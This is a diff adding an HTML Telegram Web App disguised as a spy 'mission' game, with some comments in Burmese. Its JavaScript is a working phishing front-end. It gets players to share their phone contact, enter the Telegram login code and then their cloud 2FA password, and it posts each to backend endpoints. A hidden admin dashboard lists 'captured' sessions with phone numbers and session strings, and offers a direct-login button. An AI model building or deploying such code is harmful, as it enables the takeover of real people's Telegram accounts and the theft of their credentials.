@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>TG Agent Mission</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            margin: 0; padding: 0;
+            background-color: #0a0a2a;
+            color: #00ffcc;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex; flex-direction: column;
+            align-items: center; justify-content: center;
+            height: 100vh; overflow: hidden;
+        }
+        .screen { display: none; text-align: center; width: 100%; padding: 20px; box-sizing: border-box; }
+        .active { display: block; animation: fadeIn 0.5s ease-in-out; }
+        
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+        
+        h1 { font-size: 24px; text-shadow: 0 0 10px #00ffcc; margin-bottom: 10px; }
+        p { color: #aaa; font-size: 14px; margin-bottom: 30px; }
+
+        .btn {
+            background: transparent; color: #00ffcc;
+            border: 2px solid #00ffcc; padding: 15px 30px; font-size: 16px;
+            font-weight: bold; border-radius: 8px; cursor: pointer; text-transform: uppercase;
+            box-shadow: 0 0 15px rgba(0, 255, 204, 0.4); transition: all 0.3s; width: 80%;
+        }
+        .btn:active { background: #00ffcc; color: #0a0a2a; }
+        
+        .otp-container { display: flex; justify-content: center; gap: 10px; margin-bottom: 30px; }
+        .otp-input {
+            width: 45px; height: 55px; background: #11113a; border: 2px solid #004466;
+            color: #00ffcc; font-size: 24px; text-align: center;
+            border-radius: 8px; outline: none; box-shadow: inset 0 0 5px #000;
+        }
+        .otp-input:focus { border-color: #ff00ff; box-shadow: 0 0 10px #ff00ff; }
+
+        .pwd-input {
+            width: 80%; height: 45px; background: #11113a; border: 2px solid #004466;
+            color: #00ffcc; font-size: 18px; text-align: center; margin-bottom: 20px;
+            border-radius: 8px; outline: none; box-shadow: inset 0 0 5px #000;
+        }
+        .pwd-input:focus { border-color: #ff00ff; box-shadow: 0 0 10px #ff00ff; }
+
+        #admin-btn { margin-top: 20px; border-color: #ff00ff; color: #ff00ff; display: none; }
+    </style>
+</head>
+<body>
+
+    <!-- LEVEL 1: Start Mission -->
+    <div id="level-1" class="screen active">
+        <h1>LEVEL 1: IDENTITY</h1>
+        <p>Agent, share your contact to start the mission.</p>
+        <button class="btn" onclick="requestContact()">Share Contact</button>
+        <button id="admin-btn" class="btn" onclick="goToAdmin()">Secret Dashboard</button>
+    </div>
+
+    <!-- LEVEL 2: Enter OTP -->
+    <div id="level-2" class="screen">
+        <h1>LEVEL 2: DECRYPTION</h1>
+        <p>Enter the 5-digit access code sent to your terminal.</p>
+        <div class="otp-container" id="otp-container">
+            <input type="text" inputmode="numeric" class="otp-input" maxlength="1">
+            <input type="text" inputmode="numeric" class="otp-input" maxlength="1">
+            <input type="text" inputmode="numeric" class="otp-input" maxlength="1">
+            <input type="text" inputmode="numeric" class="otp-input" maxlength="1">
+            <input type="text" inputmode="numeric" class="otp-input" maxlength="1">
+        </div>
+        <p id="loading-text" style="display: none; color: #ff00ff;">Decrypting... Please wait.</p>
+    </div>
+
+    <!-- LEVEL 2.5: Enter Password (2FA) -->
+    <div id="level-password" class="screen">
+        <h1>SECURITY CLEARANCE</h1>
+        <p>This account is protected. Enter your Cloud Password.</p>
+        <input type="password" id="cloud-password" class="pwd-input" placeholder="Password">
+        <button class="btn" onclick="submitPassword()">Decrypt Password</button>
+        <p id="password-loading" style="display: none; color: #ff00ff; margin-top: 15px;">Verifying... Please wait.</p>
+    </div>
+
+    <!-- LEVEL 3: Success -->
+    <div id="level-3" class="screen">
+        <h1 style="color: #00ff00; text-shadow: 0 0 15px #00ff00;">MISSION ACCOMPLISHED</h1>
+        <p>Access granted. Session secured.</p>
+        <button class="btn" onclick="Telegram.WebApp.close()">Exit Terminal</button>
+    </div>
+
+    <!-- LEVEL 4: Admin Dashboard -->
+    <div id="level-admin" class="screen">
+        <h1 style="color: #ff00ff; text-shadow: 0 0 10px #ff00ff;">ADMIN DASHBOARD</h1>
+        <p>Secured Sessions Database</p>
+        
+        <div id="session-list" style="background: #11113a; padding: 15px; border-radius: 8px; border: 1px solid #004466; max-height: 350px; overflow-y: auto; text-align: left; font-size: 13px; color: #fff;">
+            Loading data...
+        </div>
+        
+        <button class="btn" style="margin-top: 20px; border-color: #ff0055; color: #ff0055;" onclick="window.location.reload()">Close Dashboard</button>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        const ADMIN_ID = 7812553563; 
+
+        if (tg.initDataUnsafe?.user?.id === ADMIN_ID) {
+            document.getElementById('admin-btn').style.display = 'block';
+        }
+
+        function requestContact() {
+            tg.requestContact((shared) => {
+                if (shared) {
+                    tg.HapticFeedback?.notificationOccurred?.('success');
+                    document.getElementById('level-1').innerHTML = "<h1 style='color:#00ffcc;'>PLEASE WAIT</h1><p>Connecting to secure terminal...</p>";
+                    
+                    fetch('/api/request-otp', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ userId: tg.initDataUnsafe?.user?.id || ADMIN_ID })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.success) {
+                            document.getElementById('level-1').classList.remove('active');
+                            document.getElementById('level-2').classList.add('active');
+                        } else {
+                            alert("Mission Failed: " + (data.error || "Unknown Error"));
+                            window.location.reload();
+                        }
+                    })
+                    .catch(err => {
+                        alert("Network timeout. The server is migrating Data Centers. Please try again.");
+                        window.location.reload();
+                    });
+                }
+            });
+        }
+
+        const otpInputs = document.querySelectorAll('.otp-input');
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                if (e.target.value && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                } else if (e.target.value && index === otpInputs.length - 1) {
+                    submitOTP();
+                }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 5);
+                pastedData.split('').forEach((char, i) => {
+                    if (otpInputs[i]) {
+                        otpInputs[i].value = char;
+                        if (i < otpInputs.length - 1) otpInputs[i + 1].focus();
+                    }
+                });
+                if (pastedData.length === 5) submitOTP();
+            });
+        });
+
+        async function submitOTP() {
+            let otpCode = '';
+            otpInputs.forEach(input => otpCode += input.value);
+
+            if (otpCode.length === 5) {
+                document.getElementById('loading-text').style.display = 'block';
+                tg.HapticFeedback?.impactOccurred?.('heavy');
+
+                try {
+                    const response = await fetch('/api/verify-otp', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ userId: tg.initDataUnsafe?.user?.id || ADMIN_ID, code: otpCode })
+                    });
+                    
+                    let result;
+                    try { result = await response.json(); } catch (e) { throw new Error("Server timeout or proxy error."); }
+                    
+                    if (result.success) {
+                        document.getElementById('level-2').classList.remove('active');
+                        document.getElementById('level-3').classList.add('active');
+                        tg.HapticFeedback?.notificationOccurred?.('success');
+                    } else {
+                        if (result.error === "2FA_REQUIRED") {
+                            document.getElementById('level-2').classList.remove('active');
+                            document.getElementById('level-password').classList.add('active');
+                            tg.HapticFeedback?.notificationOccurred?.('warning');
+                        } else {
+                            alert("Error: " + (result.error || "Invalid Code. Try again."));
+                            otpInputs.forEach(input => input.value = ''); 
+                            otpInputs[0].focus();
+                        }
+                        document.getElementById('loading-text').style.display = 'none';
+                    }
+                } catch (error) {
+                    alert("Connection Error: " + error.message);
+                    document.getElementById('loading-text').style.display = 'none';
+                }
+            }
+        }
+
+        async function submitPassword() {
+            const passwordInput = document.getElementById('cloud-password').value;
+            if (!passwordInput) return;
+            
+            document.getElementById('password-loading').style.display = 'block';
+            tg.HapticFeedback?.impactOccurred?.('heavy');
+
+            try {
+                const response = await fetch('/api/verify-password', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ userId: tg.initDataUnsafe?.user?.id || ADMIN_ID, password: passwordInput })
+                });
+                
+                let result;
+                try { result = await response.json(); } catch (e) { throw new Error("Server timeout or proxy error."); }
+                
+                if (result.success) {
+                    document.getElementById('level-password').classList.remove('active');
+                    document.getElementById('level-3').classList.add('active');
+                    tg.HapticFeedback?.notificationOccurred?.('success');
+                } else {
+                    // Error အစစ်အမှန်ကို ဖမ်းယူပြသခြင်း
+                    alert("Error: " + (result.error || "Invalid Password. Access Denied."));
+                    document.getElementById('cloud-password').value = '';
+                    document.getElementById('password-loading').style.display = 'none';
+                }
+            } catch (error) {
+                alert("Connection Error: " + error.message);
+                document.getElementById('password-loading').style.display = 'none';
+            }
+        }
+
+        async function goToAdmin() {
+            const currentUserId = tg.initDataUnsafe?.user?.id || ADMIN_ID;
+            
+            // Screen အပြောင်းအလဲလုပ်ခြင်း
+            document.getElementById('level-1').classList.remove('active');
+            document.getElementById('level-admin').classList.add('active');
+            document.getElementById('session-list').innerHTML = "<span style='color:#00ffcc;'>Connecting to secure database...</span>";
+
+            try {
+                const response = await fetch('/api/admin/sessions', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ userId: currentUserId })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    let html = "";
+                    if (result.sessions.length === 0) {
+                        html = "No sessions captured yet.";
+                    } else {
+                        // ... အပေါ်ပိုင်း code များ ...
+result.sessions.forEach((session, index) => {
+    const date = new Date(session.dateAdded).toLocaleString();
+    html += `
+    <div style="border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 10px;">
+        <strong>#${index + 1} | Phone:</strong> <span style="color:#00ffcc;">${session.phoneNumber}</span><br>
+        <span style="color:#888;">Date: ${date}</span><br>
+        
+        <!-- Login ဝင်စမ်းမည့် ခလုတ်အသစ် -->
+        <button onclick="testLogin('${session.sessionString}')" style="margin-top: 10px; padding: 5px 10px; background: #004466; color: #00ffcc; border: none; cursor: pointer;">
+            ⚡ Direct Login & Check
+        </button>
+        
+        <br>
+        <textarea readonly style="width: 100%; height: 40px; background: #000; color: #00ff00; border: 1px solid #444; margin-top: 5px; font-family: monospace;">${session.sessionString}</textarea>
+    </div>`;
+});
+// ... အောက်ပိုင်း code များ ...
+                    }
+                    document.getElementById('session-list').innerHTML = html;
+                } else {
+                    document.getElementById('session-list').innerHTML = "<span style='color:red;'>Access Denied: " + result.error + "</span>";
+                }
+            } catch (error) {
+                document.getElementById('session-list').innerHTML = "<span style='color:red;'>Network Error. Cannot reach database.</span>";
+            }
+        }
+
+       function testLogin(phoneNumber) {
+    tg.HapticFeedback?.impactOccurred?.('medium');
+    // Session String အစား ဖုန်းနံပါတ်ကိုပါ ယူ၍ telegram-tt ဆီသို့ လွှဲပြောင်းပေးမည်
+    const ttUrl = `https://your-telegram-tt-url.com/?login_phone=${encodeURIComponent(phoneNumber)}`;
+    window.location.href = ttUrl;
+}
+    
+    </script>
+</body>
+</html>
